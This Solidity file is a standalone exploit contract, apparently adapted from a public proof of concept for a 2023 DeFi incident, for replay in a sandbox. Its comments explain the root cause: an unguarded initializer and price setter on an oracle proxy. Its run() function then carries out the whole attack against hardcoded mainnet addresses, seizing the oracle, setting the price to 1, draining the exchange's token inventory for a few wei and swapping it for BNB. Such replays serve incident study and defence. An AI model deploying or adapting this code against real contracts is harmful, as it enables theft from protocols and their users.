// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-LocalTrader).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `LCTExp` test
// harness — `address(this)` is the attacker, the `receive()` that collects the
// swapped BNB lives on the test itself, and there is no standalone contract to
// deploy. This file is a faithful, self-contained copy of that inline attack
// (testExp body -> run()), compiled inside the registry forge project. Logic
// and constants are copied verbatim from test/LocalTrader_exp.sol.
//
// Root cause: LCTExchange.buyTokens() sizes its LCT payout as
// `tokenAmount = (msg.value / price) * 1e18`, where `price` comes from an
// upgradeable price-oracle proxy (0x303554…) whose implementation exposes two
// UNAUTHENTICATED functions — a re-runnable initializer `storeConstructor`
// (selector 0xb5863c10) and a `setPrice` (selector 0x925d400c). Neither has an
// access guard, so anyone can set the price divisor to 1, after which
// buyTokens() hands over the exchange's ENTIRE LCT inventory for a few wei of
// BNB. The stolen LCT is then dumped into the LCT/WBNB PancakeSwap pair for
// ~383.24 native BNB. No flash loan is needed.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ILCTExchange {
    function buyTokens() external payable;
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract LocalTraderOracleDrain {
    // --- victims / constants (copied verbatim from test/LocalTrader_exp.sol) ----
    address constant VICTIM_PROXY = 0x303554d4D8Bd01f18C6fA4A8df3FF57A96071a41; // price-oracle proxy
    IUniswapV2Router02 constant ROUTER = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); // PancakeRouter
    ILCTExchange constant EXCHANGE = ILCTExchange(0xcE3e12bD77DD54E20a18cB1B94667F3E697bea06); // LCTExchange
    IERC20 constant LCT = IERC20(0x5C65BAdf7F97345B7B92776b22255c973234EfE7); // LocalTraders token
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    // A throwaway address the original PoC wrote into the oracle's owner slot.
    address constant TEMP = 0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE;

    function run() external {
        // Step 1: seize the oracle — `storeConstructor` is an unguarded,
        // re-runnable initializer that rewrites the owner/admin slots.
        (bool s1,) = VICTIM_PROXY.call(abi.encodeWithSelector(0xb5863c10, TEMP));
        require(s1, "change ownership failed");

        // Step 2: set the price divisor to 1 — `setPrice` has no access guard.
        (bool s2,) = VICTIM_PROXY.call(abi.encodeWithSelector(0x925d400c, uint256(1)));
        require(s2, "manipulate price failed");

        // Step 3: buy the exchange's ENTIRE LCT inventory for dust. With
        // price == 1, tokenAmount = msg.value * 1e18, so sending
        // `balanceOf(exchange) / 1e18` wei redeems that many whole LCT.
        uint256 amount = LCT.balanceOf(address(EXCHANGE)) / 1e18;
        EXCHANGE.buyTokens{value: amount}();

        // Step 4: dump the stolen LCT into the LCT/WBNB pair for native BNB.
        LCT.approve(address(ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(LCT);
        path[1] = WBNB;
        ROUTER.swapExactTokensForETHSupportingFeeOnTransferTokens(
            LCT.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
    }

    // Collects the native BNB the router unwraps at the end of the swap.
    receive() external payable {}
}
